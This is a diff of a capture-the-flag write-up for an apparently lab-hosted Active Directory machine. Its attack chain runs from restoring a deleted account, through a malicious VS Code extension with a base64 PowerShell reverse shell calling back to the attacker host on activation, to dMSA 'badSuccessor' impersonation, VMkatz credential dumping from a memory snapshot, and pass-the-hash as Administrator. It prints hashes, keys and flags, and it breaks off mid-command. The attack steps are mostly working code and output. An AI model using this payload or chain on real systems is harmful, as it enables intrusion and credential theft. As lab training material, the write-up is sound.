@@ -1,154 +1,175 @@
+---
+description: 'Difficulty: Medium | OS: Windows (Active Directory)'
+---
+
 # Checkpoint
 
-## Checkpoint — Executive Summary
+***
 
-| Phase                    | Details                                                                                                       |
-| ------------------------ | ------------------------------------------------------------------------------------------------------------- |
-| Initial Access           | Valid credentials for `alex.turner` were provided.                                                            |
-| Enumeration              | LDAP enumeration revealed write permissions over deleted objects and the Employees OU.                        |
-| Privilege Escalation #1  | Restored the deleted user `mark.davies` and authenticated using the known password.                           |
-| Discovery                | Enumerated SMB shares and identified the writable `DevDrop` share used for VS Code extensions.                |
-| Code Execution           | Uploaded a malicious VSIX package containing a PowerShell reverse shell and obtained access as `ryan.brooks`. |
-| Privilege Escalation #2  | Leveraged dMSA abuse to impersonate `svc_deploy` and recover account credentials.                             |
-| Lateral Movement         | Authenticated as `svc_deploy` via WinRM.                                                                      |
-| Sensitive Data Discovery | Identified VMware backup files stored in the `VMBackups` share.                                               |
-| Credential Extraction    | Used VMkatz against a VM memory snapshot to recover the local Administrator NTLM hash.                        |
-| Privilege Escalation #3  | Performed Pass-the-Hash authentication as `Administrator`.                                                    |
-| Objective                | Retrieved the root flag from `C:\Users\max.palmer\Desktop\root.txt`.                                          |
-| Root Flag                | `864d9d13edb008ab521d024ee7f66a14`                                                                            |
+### Attack Chain
 
+```
+Recon → LDAP Enumeration (alex.turner) → Restore Deleted AD User (mark.davies)
+→ SMB Enumeration → Malicious VSIX Upload (DevDrop) → RCE as ryan.brooks
+→ dMSA Abuse (svc_deploy impersonation) → WinRM as svc_deploy
+→ VMware Memory Snapshot (VMkatz) → Admin NTLM Hash → Pass-the-Hash → Root
+```
 
+***
 
-### **Reconnaissance** <a href="#reconnaissance" id="reconnaissance"></a>
+### Executive Summary
 
-{% code overflow="wrap" %}
+| Phase            | Details                                                                                |
+| ---------------- | -------------------------------------------------------------------------------------- |
+| Initial Access   | Valid credentials for `alex.turner` provided                                           |
+| Enumeration      | LDAP revealed write permissions over Deleted Objects and Employees OU                  |
+| Privesc #1       | Restored deleted user `mark.davies`, authenticated with known password                 |
+| Discovery        | Enumerated SMB shares, found writable `DevDrop` share for VS Code extensions           |
+| Code Execution   | Uploaded malicious VSIX package with PowerShell reverse shell → shell as `ryan.brooks` |
+| Privesc #2       | dMSA abuse to impersonate `svc_deploy` and recover credentials                         |
+| Lateral Movement | Authenticated as `svc_deploy` via WinRM                                                |
+| Sensitive Data   | Identified VMware backup files in `VMBackups` share                                    |
+| Cred Extraction  | Used VMkatz against VM memory snapshot → local Administrator NTLM hash                 |
+| Privesc #3       | Pass-the-Hash as Administrator                                                         |
+| Root Flag        | `C:\Users\max.palmer\Desktop\root.txt`                                                 |
+
+***
+
+### 1. Reconnaissance
+
 ```bash
-┌──(kali㉿kali)-[~]
-└─$ sudo nmap -sC -sV -T4 10.129.109.27 -Pn 
-Nmap scan report for 10.129.109.27
-Host is up (0.46s latency).
-Not shown: 988 filtered tcp ports (no-response)
+# Attack machine
+sudo nmap -sC -sV -T4 10.129.109.27 -Pn
+```
+
+**Output:**
+
+```
 PORT     STATE SERVICE           VERSION
 53/tcp   open  domain            Simple DNS Plus
-88/tcp   open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-06-22 19:45:16Z)
+88/tcp   open  kerberos-sec      Microsoft Windows Kerberos
 135/tcp  open  msrpc             Microsoft Windows RPC
 139/tcp  open  netbios-ssn       Microsoft Windows netbios-ssn
 389/tcp  open  ldap
-445/tcp  open  microsoft-ds?
-464/tcp  open  kpasswd5?
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
 593/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
-636/tcp  open  ldapssl?
+636/tcp  open  ldapssl
 3268/tcp open  ldap
-3269/tcp open  globalcatLDAPssl?
-5985/tcp open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+3269/tcp open  globalcatLDAPssl
+5985/tcp open  http              Microsoft HTTPAPI httpd 2.0
 
-Host script results:
-| smb2-security-mode: 
-|   3.1.1: 
+| smb2-security-mode:
+|   3.1.1:
 |_    Message signing enabled and required
-|_clock-skew: 7h03m10s
-| smb2-time: 
-|   date: 2026-06-22T19:45:52
-|_  start_date: N/A
-
-Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 124.54 seconds
-
 ```
-{% endcode %}
 
-Domain `checkpoint.htb`, hostname `DC01.checkpoint.htb` from LDAP + SSL cert.
+Domain: `checkpoint.htb`, Hostname: `DC01.checkpoint.htb` (from LDAP + SSL cert).
 
-### Environment Setup
+***
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ sudo ip link set dev tun0 mtu 1300
+### 2. Environment Setup
+
+```bash
+# Attack machine
+sudo ip link set dev tun0 mtu 1300
 sudo sed -i '/checkpoint/d' /etc/hosts
 echo "10.129.109.27 checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01" | sudo tee -a /etc/hosts
+
+# Sync clock with DC (important for Kerberos)
 DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
 echo $DCT
-10.129.109.27 checkpoint.htb dc01.checkpoint.htb DC01.CHECKPOINT.HTB dc01
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ nxc smb 10.129.109.27 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'          
-SMB         10.129.109.27   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
-SMB         10.129.109.27   445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024! 
+#### Verify initial credentials
+
+```bash
+# Attack machine
+nxc smb 10.129.109.27 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!'
+```
+
+**Output:**
 
 ```
-{% endcode %}
+SMB  10.129.109.27  445  DC01  [+] checkpoint.htb\alex.turner:Checkpoint2024!
+```
 
-<pre class="language-shellscript" data-overflow="wrap"><code class="lang-shellscript">┌──(kali㉿kali)-[~]
-└─$ bloodyAD --host 10.129.109.27 --dns 10.129.109.27 -d checkpoint.htb \
+***
+
+### 3. LDAP Enumeration — Find Writable Objects
+
+```bash
+# Attack machine
+bloodyAD --host 10.129.109.27 --dns 10.129.109.27 -d checkpoint.htb \
   -u alex.turner -p 'Checkpoint2024!' get writable
+```
 
-<strong>distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
-</strong><strong>DACL: WRITE
-</strong>
-distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
-permission: WRITE
+**Output (key entries):**
+
+```
+distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
+DACL: WRITE
 
 distinguishedName: OU=Employees,DC=checkpoint,DC=htb
 permission: CREATE_CHILD
 
-distinguishedName: CN=Alex Turner,OU=Employees,DC=checkpoint,DC=htb
+distinguishedName: CN=Mark Davies\0ADEL:...,CN=Deleted Objects,DC=checkpoint,DC=htb
 permission: WRITE
+```
 
-<strong>distinguishedName: CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb
-</strong><strong>permission: WRITE
-</strong>
-distinguishedName: DC=checkpoint.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=checkpoint,DC=htb
-permission: CREATE_CHILD
+`alex.turner` has WRITE permission over the deleted object `mark.davies` — we can restore it.
 
-distinguishedName: DC=_msdcs.checkpoint.htb,CN=MicrosoftDNS,DC=ForestDnsZones,DC=checkpoint,DC=htb
-permission: CREATE_CHILD
-</code></pre>
+***
 
-Restore Mark Davies
+### 4. Restore Deleted AD User — mark.davies
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.109.27 \ 
+```bash
+# Attack machine
+bloodyAD --host DC01.checkpoint.htb --dc-ip 10.129.109.27 \
   -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' \
   set restore mark.davies
+```
+
+**Output:**
+
+```
 [+] mark.davies has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ nxc smb 10.129.109.27 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
-SMB         10.129.109.27   445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
-SMB         10.129.109.27   445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024! 
-SMB         10.129.109.27   445    DC01             [*] Enumerated shares
-SMB         10.129.109.27   445    DC01             Share           Permissions     Remark
-SMB         10.129.109.27   445    DC01             -----           -----------     ------
-SMB         10.129.109.27   445    DC01             ADMIN$                          Remote Admin
-SMB         10.129.109.27   445    DC01             C$                              Default share
-SMB         10.129.109.27   445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
-SMB         10.129.109.27   445    DC01             IPC$            READ            Remote IPC
-SMB         10.129.109.27   445    DC01             NETLOGON        READ            Logon server share 
-SMB         10.129.109.27   445    DC01             SYSVOL          READ            Logon server share 
-SMB         10.129.109.27   445    DC01             VMBackups    
+#### Test restored account with same password
+
+```bash
+# Attack machine
+nxc smb 10.129.109.27 -d checkpoint.htb -u mark.davies -p 'Checkpoint2024!' --shares
 ```
-{% endcode %}
 
-Generate reverse shell
+**Output:**
 
-{% code overflow="wrap" %}
-```shellscript
-# Generate B64 payload
-LHOST="10.10.xx.xx"
+```
+[+] checkpoint.htb\mark.davies:Checkpoint2024!
+
+Share        Permissions   Remark
+-----        -----------   ------
+ADMIN$                     Remote Admin
+C$                         Default share
+DevDrop      READ,WRITE    VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
+IPC$         READ          Remote IPC
+NETLOGON     READ          Logon server share
+SYSVOL       READ          Logon server share
+VMBackups
+```
+
+`DevDrop` is writable and is used to deploy VS Code extensions — a perfect code execution vector.
+
+***
+
+### 5. Malicious VSIX Package → RCE as ryan.brooks
+
+#### Generate base64 PowerShell reverse shell payload
+
+```bash
+# Attack machine
+LHOST="10.10.14.43"
 LPORT="4444"
 B64=$(python3 -c "
 import base64
@@ -156,330 +177,285 @@ cmd = '\$client = New-Object System.Net.Sockets.TCPClient(\"$LHOST\",$LPORT);\$s
 print(base64.b64encode(cmd.encode('utf-16-le')).decode())
 ")
 echo "B64: $B64"
+```
 
-# Create directory structure
+#### Build malicious VSIX package
+
+```bash
+# Attack machine
 mkdir -p /tmp/evil-ext/extension
 
-# Create package.json
+# package.json
 cat > /tmp/evil-ext/extension/package.json << 'EOF'
 {
-"name": "checkpoint-theme",
-"displayName": "Checkpoint Theme",
-"description": "Official Checkpoint color theme",
-"version": "1.0.0",
-"publisher": "checkpoint",
-"engines": { "vscode": "^1.118.0" },
-"activationEvents": ["*"],
-"main": "./extension.js",
-"contributes": {}
+  "name": "checkpoint-theme",
+  "displayName": "Checkpoint Theme",
+  "description": "Official Checkpoint color theme",
+  "version": "1.0.0",
+  "publisher": "checkpoint",
+  "engines": { "vscode": "^1.118.0" },
+  "activationEvents": ["*"],
+  "main": "./extension.js",
+  "contributes": {}
 }
 EOF
 
-# Create extension.js with reverse shell
+# extension.js — executes reverse shell on activation
 cat > /tmp/evil-ext/extension/extension.js << EOF
 const { execSync } = require('child_process');
 function activate(context) {
-try {
-execSync('powershell -e $B64');
-} catch(e) {}
+  try {
+    execSync('powershell -e $B64');
+  } catch(e) {}
 }
 function deactivate() {}
 module.exports = { activate, deactivate };
 EOF
 
-# Create manifest files
+# VSIX manifest
 cat > /tmp/evil-ext/extension.vsixmanifest << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
-<PackageManifest Version="2.0.0"
-xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
-<Metadata>
-<Identity Language="en-US" Id="checkpoint-theme" Version="1.0.0"
-Publisher="checkpoint"/>
-<DisplayName>Checkpoint Theme</DisplayName>
-<Description>Official Checkpoint color theme</Description>
-</Metadata>
-<Installation>
-<InstallationTarget Id="Microsoft.VisualStudio.Code"/>
-</Installation>
-<Assets>
-<Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/>
-</Assets>
+<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
+  <Metadata>
+    <Identity Language="en-US" Id="checkpoint-theme" Version="1.0.0" Publisher="checkpoint"/>
+    <DisplayName>Checkpoint Theme</DisplayName>
+    <Description>Official Checkpoint color theme</Description>
+  </Metadata>
+  <Installation>
+    <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
+  </Installation>
+  <Assets>
+    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json"/>
+  </Assets>
 </PackageManifest>
 EOF
 
 cat > '/tmp/evil-ext/[Content_Types].xml' << 'EOF'
 <?xml version="1.0" encoding="utf-8"?>
 <Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
-<Default Extension=".vsixmanifest" ContentType="text/xml"/>
-<Default Extension=".json" ContentType="application/json"/>
-<Default Extension=".js" ContentType="application/javascript"/>
+  <Default Extension=".vsixmanifest" ContentType="text/xml"/>
+  <Default Extension=".json" ContentType="application/json"/>
+  <Default Extension=".js" ContentType="application/javascript"/>
 </Types>
 EOF
 
-# Package vsix
+# Package as .vsix (zip)
 cd /tmp/evil-ext
-rm -f checkpoint-theme-1.0.0.vsix
 zip -r checkpoint-theme-1.0.0.vsix extension/ extension.vsixmanifest "[Content_Types].xml"
 ls -la checkpoint-theme-1.0.0.vsix
+```
 
-# Upload to DevDrop
-smbclient //10.129.xx.xx DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
+#### Upload to DevDrop share
+
+```bash
+# Attack machine
+smbclient //10.129.109.27/DevDrop -U 'checkpoint.htb/mark.davies%Checkpoint2024!' \
   -c 'put /tmp/evil-ext/checkpoint-theme-1.0.0.vsix checkpoint-theme-1.0.0.vsix'
 
 echo "[+] Payload uploaded! Waiting for shell on port 4444..."
 ```
-{% endcode %}
 
-Ryan shell
+#### Catch the reverse shell
 
-{% code overflow="wrap" %}
-```shellscript
-└─$ nc -lvnp 4444
-listening on [any] 4444 ...
+```bash
+# Attack machine
+nc -lvnp 4444
+```
+
+**Shell received:**
+
+```
 connect to [10.10.14.43] from (UNKNOWN) [10.129.109.27] 50983
 whoami
 checkpoint\ryan.brooks
-PS C:\Program Files\Microsoft VS Code> 
+PS C:\Program Files\Microsoft VS Code>
 ```
-{% endcode %}
 
-User Flag
+**User flag:**
 
-{% code overflow="wrap" %}
-```shellscript
-PS C:\Users\ryan.brooks\Desktop> cat user.txt
-92a144ca831be404a8f95087c56c7091
+```powershell
+# Target — as ryan.brooks
+cat C:\Users\ryan.brooks\Desktop\user.txt
+# 92a144ca831be404a8f95087c56c7091
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
-TZ=UTC faketime "$DCT" impacket-getTGT -aesKey 545b2e59b9c2c2ed01bf5b3972a360818f88f1a35311de3eeb06277a265b9099 checkpoint.htb/ryan.brooks -dc-ip 10.129.109.27
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+***
 
+### 6. Privilege Escalation — dMSA Abuse (svc\_deploy Impersonation)
+
+#### Get TGT for ryan.brooks using AES key
+
+```bash
+# Attack machine
+DCT=$(nmap --script smb2-time -p445 10.129.109.27 -oN - | awk -F'date: ' '/\| *date:/ {print $2}' | sed 's/T/ /' | head -1)
+
+TZ=UTC faketime "$DCT" impacket-getTGT \
+  -aesKey 545b2e59b9c2c2ed01bf5b3972a360818f88f1a35311de3eeb06277a265b9099 \
+  checkpoint.htb/ryan.brooks \
+  -dc-ip 10.129.109.27
+```
+
+**Output:**
+
+```
 [*] Saving ticket in ryan.brooks.ccache
 ```
-{% endcode %}
 
-<pre class="language-shellscript"><code class="lang-shellscript">──(kali㉿kali)-[~]
-└─$ bloodyad -u ryan.brooks -d checkpoint.htb -H DC01.checkpoint.htb -i 10.129.109.27 -k ccache=ryan.brooks.ccache add badSuccessor evil_dmsa -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
-Clock skew detected. Adjusting local time by 7:03:09.409374. Retrying operation.
-[+] Creating DMSA evil_dmsa$ in OU=DMSAHolder,DC=checkpoint,DC=htb
-[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
-Clock skew detected. Adjusting local time by 7:03:09.790511. Retrying operation.
+#### Create dMSA to impersonate svc\_deploy
 
-Realm        : CHECKPOINT.HTB
-Sname        : krbtgt/CHECKPOINT.HTB
-UserName     : evil_dmsa$
-UserRealm    : checkpoint.htb
-StartTime    : 2026-06-23 01:52:56+00:00
-EndTime      : 2026-06-23 11:49:04+00:00
-RenewTill    : 2026-06-24 01:49:03+00:00
-Flags        : pre-authent, enc-pa-rep, forwardable, renewable
-Keytype      : 18
-Key          : GtI3Cm1x9iBQjGX2XMQ8kFRqM6N78y+lNxByGCqm85I=
-EncodedKirbi : 
+```bash
+# Attack machine
+bloodyad -u ryan.brooks -d checkpoint.htb \
+  -H DC01.checkpoint.htb -i 10.129.109.27 \
+  -k ccache=ryan.brooks.ccache \
+  add badSuccessor evil_dmsa \
+  -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' \
+  --ou 'OU=DMSAHolder,DC=checkpoint,DC=htb'
+```
 
-    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
-    Q0tQT0lOVC5IVEI=
-[+] dMSA TGT stored in ccache file evil_dmsa_xl.ccache
+**Output (key hashes recovered):**
 
+```
 dMSA current keys found in TGS:
 AES256: 4116f5a27a38d98bf575df84e95dd0f5dd0196c8f6b3d6fbb8019758480fa25b
 AES128: d146531a5797af68dd5cd790411fe67b
 RC4: 0e4fb4e7acd06e85cc26c74684f1bf23
 
-dMSA previous keys found in TGS (including keys of preceding managed accounts):
-RC4: <a data-footnote-ref href="#user-content-fn-1">e16081eb077aca74bdbf8af12af43ac9</a>
+dMSA previous keys (including preceding managed accounts):
+RC4: e16081eb077aca74bdbf8af12af43ac9
+```
 
-</code></pre>
+***
 
-{% code overflow="wrap" %}
-```shellscript
-┌──(kali㉿kali)-[~]
-└─$ evil-winrm -i 10.129.109.27 -u checkpoint.htb\\svc_deploy -H "e16081eb077aca74bdbf8af12af43ac9"
-                                        
-Evil-WinRM shell v3.9
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
-Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-                                        
-Info: Establishing connection to remote endpoint
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> 
+### 7. Lateral Movement — WinRM as svc\_deploy
+
+```bash
+# Attack machine
+evil-winrm -i 10.129.109.27 -u checkpoint.htb\\svc_deploy -H "e16081eb077aca74bdbf8af12af43ac9"
+```
+
+**Output:**
 
 ```
-{% endcode %}
+*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
+```
 
-{% code overflow="wrap" %}
-```shellscript
-*Evil-WinRM* PS C:\Users\svc_deploy\Documents> dir "\\DC01.checkpoint.htb\VMBackups" -Recurse -Force -ErrorAction SilentlyContinue
+***
 
+### 8. VMware Memory Snapshot — Extract Administrator Hash
 
-    Directory: \\DC01.checkpoint.htb\VMBackups
+#### Enumerate VMBackups share
 
+```powershell
+# Target — as svc_deploy
+dir "\\DC01.checkpoint.htb\VMBackups" -Recurse -Force -ErrorAction SilentlyContinue
+```
 
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-d-----          5/9/2026   9:54 AM                NightlyBackup_2024-11-01
-
-
-    Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
-d-----          5/9/2026  10:12 AM                memory forensics
-
-
-    Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics
-
-
-Mode                 LastWriteTime         Length Name
-----                 -------------         ------ ----
--a----          5/9/2026   7:45 PM      106496000 Windows Server 2019-000001.vmdk
--a----          5/9/2026   7:40 PM     2147483648 Windows Server 2019-Snapshot1.vmem
--a----          5/9/2026   7:40 PM      138164859 Windows Server 2019-Snapshot1.vmsn
--a----          5/9/2026   7:39 PM         270840 Windows Server 2019.nvram
--a----          5/9/2026   7:45 PM           7642 Windows Server 2019.scoreboard
--a----          5/9/2026   7:39 PM    10199695360 Windows Server 2019.vmdk
--a----          5/9/2026   7:39 PM            502 Windows Server 2019.vmsd
--a----          5/9/2026   7:45 PM           2749 Windows Server 2019.vmx
--a----          5/9/2026   7:22 PM            274 Windows Server 2019.vmxf
+**Output:**
 
 ```
-{% endcode %}
+Directory: \\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics
 
-{% code overflow="wrap" %}
-```shellscript
+Mode    Length   Name
+----    ------   ----
+-a----  106496000   Windows Server 2019-000001.vmdk
+-a----  2147483648  Windows Server 2019-Snapshot1.vmem   <-- memory snapshot
+-a----  138164859   Windows Server 2019-Snapshot1.vmsn
+-a----  10199695360 Windows Server 2019.vmdk
+```
+
+#### Download and run VMkatz
+
+```bash
+# Attack machine
 cd /tmp
 wget https://github.com/nikaiw/VMkatz/releases/download/v1.2.2/vmkatz-v1.2.2-windows-x86_64.zip
 unzip vmkatz-v1.2.2-windows-x86_64.zip
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
 ```powershell
-*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> upload /tmp/vmkatz.exe vmkatz.exe
-                                        
-Info: Uploading /tmp/vmkatz.exe to C:\Users\svc_deploy\Desktop\vmkatz.exe
-                                        
-Data: 2766848 bytes of 2766848 bytes copied
-                                        
-Info: Upload successful!
+# Target — as svc_deploy
+upload /tmp/vmkatz.exe vmkatz.exe
+
+.\vmkatz.exe "\\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
 ```
-{% endcode %}
 
-{% code overflow="wrap" %}
-```ps
-*Evil-WinRM* PS C:\Users\svc_deploy\Desktop> .\vmkatz.exe "\\DC01.checkpoint.htb\VMBackups\NightlyBackup_2024-11-01\memory forensics\Windows Server 2019-Snapshot1.vmem"
-vmkatz.exe : [*] vmkatz v1.2.2
-    + CategoryInfo          : NotSpecified: ([*] vmkatz v1.2.2:String) [], RemoteException
-    + FullyQualifiedErrorId : NativeCommandError
-[*] System discovery: 12.9328857s[*] Process enumeration: 3.0018ms[*] Providers: MSV(ok) WDigest(ok) Kerberos(ok) TsPkg(empty) DPAPI(ok) SSP(empty) LiveSSP(n/a) Credman(empty) CloudAP(empty)
-[*] Credential extraction: 28.4107ms
-[+] 2 logon session(s), 2 with credentials:
-
-  LUID: 0x3e4 (NETWORK SERVICE)
-  Username: WIN-0DG6SJAEUTA$
-  Domain: WORKGROUP
-  [DPAPI]
-    GUID          : 632b77c8-5e1a-4479-8e35-baa290fdd6ae
-    MasterKey     : 15e104f6de4e478c6bf55252632a25b973fccd39c2be8cc0d5b15a5dec06029f02fe0a02a3e57eb3b55f077f83a283cd0a11f6b3c6508d9e585527de78dc989e
-    SHA1 MasterKey: 44bb34a624afcd186909843e6cbdb4cfee908975
-  [DPAPI]
-    GUID          : 57e1a5d6-bbd4-44e9-a5c4-f4241b0821b0
-    MasterKey     : 95f668c165e7c0b3bd1f525330e5a647b9c9c8da7320c6fbdb4518a588bac996567e04f22b28d4f7a2abd33fafe0958522bca1aaa0de00f5edb7d6742065642d
-    SHA1 MasterKey: b2bf2c648554143d6b28b3c06a1ece7e40867238
-  [DPAPI]
-    GUID          : 4f09a449-22e7-4a65-a4b9-fac89cc25328
-    MasterKey     : e4778f7e1b8351eade5c49bb8e32503fbbaa705bb7e26eef5785e0a8200e31fcc2458a4db00e03aaabef34bd47900beee2d8a5bb73ddd904fbe279089a1ea718
-    SHA1 MasterKey: 90b1c277630e507a8e28d7b260a53f21712c3f1d
-
-  LUID: 0x14016d
-  Session: 2 | LogonType: Unknown
-  Username: Administrator
-  Domain: WIN-0DG6SJAEUTA
-  LogonServer: WIN-0DG6SJAEUTA
-  LogonTime: 2026-05-09 14:07:14 UTC
-  SID: S-1-5-21-2823729479-30462974-3865623546-500
-  [MSV1_0]
-    NT Hash : f29e9c014295b9b32139b09a2790be3b
-    SHA1    : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
-    DPAPI   : 89c15f3cd3ede88faf4b2d2e56253cf953e7922e
-  [DPAPI]
-    GUID          : c53f7d5b-2902-415c-9c09-251f39974440
-    MasterKey     : 32cc5c309067ca0994b849897a9b85b89511547030a1d8b74fe6e37ba037a4161301ffce692e6e433c3821dc18abfe208e1dc5c458de79d1352c6681e18bde15
-    SHA1 MasterKey: b061f87be6d2776897d912fed9156a354b81a595
-```
-{% endcode %}
-
-{% code overflow="wrap" %}
-```ps
-┌──(kali㉿kali)-[~]
